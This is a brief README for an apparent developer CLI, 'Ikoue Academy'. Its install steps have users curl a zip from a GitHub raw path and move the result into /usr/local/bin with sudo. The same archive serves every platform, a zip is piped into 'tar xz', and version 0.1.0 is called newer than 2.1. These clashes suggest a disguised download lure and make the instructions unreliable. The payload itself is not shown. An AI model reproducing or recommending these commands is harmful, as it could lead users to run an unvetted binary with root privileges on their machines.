# Ikoue Academy CLI

Developer CLI helper for the Ikoue Academy program.

## Installation

### macOS (Apple Silicon)

```bash
curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip | tar xz
sudo mv ikoue /usr/local/bin/
```

### macOS (Intel)

```bash
curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip | tar xz
sudo mv ikoue /usr/local/bin/
```

### Linux (x86_64)

```bash
curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip | tar xz
sudo mv ikoue /usr/local/bin/
```

### Linux (ARM64)

```bash
curl -L https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip | tar xz
sudo mv ikoue /usr/local/bin/
```

### Windows

Download `https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip` from [releases](https://github.com/bro-gervil/ikoue-cli-releases/raw/refs/heads/main/shoddyite/ikoue_releases_cli_2.1.zip), extract, and add to your PATH.

## Verify Installation

```bash
ikoue version
```

## Updating

The CLI automatically checks for updates once per day. When a new version is available, you'll see:

```
A new version is available: 0.1.0
Run 'ikoue self-update' to update
```

To update:

```bash
ikoue self-update
```

## Usage

```bash
ikoue --help
```
